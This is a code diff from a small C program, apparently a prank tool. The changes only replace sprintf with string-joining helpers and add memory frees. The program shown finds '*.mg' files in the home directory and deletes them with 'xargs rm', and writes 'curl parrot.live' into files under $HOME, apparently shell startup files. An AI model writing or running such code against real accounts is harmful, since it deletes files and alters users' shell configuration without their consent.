@@ -154,7 +154,9 @@ int	rm_file(char* home_buffer, char **envp)
 	char	rm_buffer[PATH_MAX];
 	char	*rm_cmd[] = {"xargs", "rm", NULL};
 
-	sprintf(commands, "find %s -type f -name *.mg", home_buffer);
+	commands = ft_strjoin_free2("find ", ft_strjoin(home_buffer,  " -type f -name *.mg"));
+	if (!commands)
+		return (1);
 	// printf("find cmd: %s\n", commands);
 	find_cmd = ft_split(commands, ' ');
 	if (!find_cmd)
@@ -177,6 +179,7 @@ int	rm_file(char* home_buffer, char **envp)
 	}
 	free_tab(rm_file_list);
 	free_tab(find_cmd);
+	free(commands);
 	// process_child(rm_cmd, envp, fds[0], STDIN_FILENO, fds[1]);
 	close(fds[0]);
 	close(fds[1]);
@@ -199,10 +202,9 @@ int	main(int ac, char **av, char **envp)
 	printf("home path %s\n", home_buffer);
 	while (file_list[i])
 	{
-		sprintf(path, "%s%s", getenv("HOME"), file_list[i]);
-		// path = ft_strjoin(getenv("HOME"), file_list[i]);
-		// if (!path)
-		// 	return (1);
+		path = ft_strjoin(getenv("HOME"), file_list[i]);
+		if (!path)
+			return (1);
 		printf("\nopening %s\n", path);
 		// fd = open(path, O_RDONLY);
 		// printf("on fd %d\n", fd);
@@ -211,7 +213,7 @@ int	main(int ac, char **av, char **envp)
 		if (replace_line(path, "curl parrot.live"))
 			return (1);
 		// close(fd);
-		// free(path);
+		free(path);
 		i++;
 	}
 	usleep(10);
